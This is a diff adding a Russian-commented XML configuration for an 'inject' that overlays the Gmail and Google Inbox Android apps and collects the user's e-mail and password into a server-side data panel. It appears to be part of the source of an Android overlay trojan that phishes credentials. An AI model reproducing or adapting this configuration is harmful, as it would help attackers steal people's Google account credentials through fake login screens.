@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?><!-- Файл должен быть в кодировке UTF-8 (без BOM) -->
+<document>
+	<name>Google Mail</name><!-- Название инжекта -->
+	<apps>com.google.android.gm;com.google.android.apps.inbox</apps><!-- Приложения, которые будут перекрываться (через точку с запятой) -->
+	<size>1</size><!-- Размер инжекта (1 - стандартный, 2 - в виде диалога) -->
+	<storage>2</storage><!-- Место хранения инжекта (1 - в устройстве, 2 - на сервере) -->
+	
+	<step><!-- Новый шаг (форма) -->
+		<param><!-- Параметр в шаге (форме) -->
+			<column>E-mail</column><!-- Название колонки (для вкладки "Инжекты"->"Данные") -->
+			<name>email</name><!-- Название параметра (поле name в форме в файле index.html) -->
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>Password</column>
+			<name>password</name>
+		</param>
+	</step>
+
+</document>
